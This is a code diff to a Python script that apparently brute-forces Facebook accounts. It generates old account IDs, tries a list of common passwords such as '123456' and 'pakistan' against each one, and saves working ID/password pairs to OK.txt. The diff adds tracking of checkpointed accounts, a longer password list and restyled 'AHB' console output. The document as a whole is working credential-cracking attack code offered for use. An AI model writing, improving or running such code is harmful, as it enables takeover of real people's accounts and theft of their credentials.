@@ -36,6 +36,7 @@ from bs4 import BeautifulSoup as sop
 
 loop = 0
 oks = []
+cps = []
 ugent = []
 tred = ThreadPool
 
@@ -202,6 +203,7 @@ def old_One():
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
+    result(oks)
 
 
 def old_Tow():
@@ -235,17 +237,18 @@ def old_Tow():
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
+    result(oks)
 
 
 def old_Tree():
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
@@ -267,12 +270,14 @@ def old_Tree():
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
+    result(oks)
 
 
 def cracker(user):
 	global loop
 	global oks
-	pwx = ['123456', '12345678', '123456789', 'password', 'khan123', 'pakistan']
+	global cps
+	pwx = ['1234', '12345', '123456', '12345678', '123456789', 'password', 'khan123', 'pakistan']
 	try:
 		for pw in pwx:
 			ses=requests.Session()
@@ -324,17 +329,25 @@ def cracker(user):
 				yug = creationyear(user)
 				if yug == '':
 					yug = 'Unknown'
-				print(f'\033[1;32m [arsalan-OK-{yug}] '+user+'|'+pw+'\033[0;97m')
+				print(f'\033[1;32m (AHB) = '+user+' = '+pw+' = '+yug+'\033[0;97m')
 				open('OK.txt', 'a').write(user+'|'+pw+' | Year: '+yug+'\n')
 				oks.append(user)
 				break
+			elif "www.facebook.com" in result_json:
+				yug = creationyear(user)
+				if yug == '':
+					yug = 'Unknown'
+				cps.append(user)
+				break
 			else:
 				continue
-		loop+=1
-		sys.stdout.write(f"\r {Z}[{H}CRACKING{Z}] [{H}{loop}{P}-{M}Checked{Z}] [{H}OK:{len(oks)}{Z}] \r")
+		
+		loop += 1
+		sys.stdout.write(f"\r\033[1;31m+(AHB-M1)\033[1;37m({loop})\033[1;32m({len(oks)})\033[1;33m({len(cps)})\r")
 		sys.stdout.flush()
 
 	except Exception as e:
+		loop += 1
 		pass
 
 
